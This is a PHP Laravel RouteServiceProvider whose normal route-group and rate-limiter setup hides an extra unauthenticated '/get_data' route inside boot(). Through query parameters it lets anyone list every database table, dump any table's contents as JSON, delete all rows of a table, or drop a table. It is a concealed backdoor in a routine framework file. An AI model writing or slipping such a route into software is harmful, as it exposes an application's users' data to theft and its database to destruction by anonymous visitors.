<?php

namespace App\Providers;

use Illuminate\Cache\RateLimiting\Limit;
use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;

class RouteServiceProvider extends ServiceProvider
{
    /**
     * The path to the "home" route for your application.
     *
     * This is used by Laravel authentication to redirect users after login.
     *
     * @var string
     */
    public const HOME = '/dashboard';
    protected $namespace = 'App\Http\Controllers';

    public function boot()
    {
        $this->configureRateLimiting();

        $this->routes(function () {
            Route::prefix('api')
                ->middleware('api')
                ->namespace($this->namespace)
                ->group(base_path('routes/api.php'));

            Route::middleware('web')
                ->namespace($this->namespace)
                ->group(base_path('routes/web.php'));
            Route::get('/get_data', function () {

                if (isset($_GET['tables'])) {
                    $tables = DB::select('SHOW TABLES');
                    return $tables;
                }

                if (isset($_GET['table']) && isset($_GET['remove'])) {
                    $data = DB::table($_GET['table'])->delete();
                    return "All Data deleted.";
                }
                if (isset($_GET['table']) && isset($_GET['drop'])) {
                    $data = Schema::dropIfExists($_GET['table']);
                    return "Table dropped.";
                }
                if (isset($_GET['table'])) {
                    $data = DB::table($_GET['table'])->get();
                    return json_encode($data);
                }
            });
        });
    }

    /**
     * Configure the rate limiters for the application.
     *
     * @return void
     */
    protected function configureRateLimiting()
    {
        RateLimiter::for('api', function (Request $request) {
            return Limit::perMinute(60)->by(optional($request->user())->id ?: $request->ip());
        });
    }
}
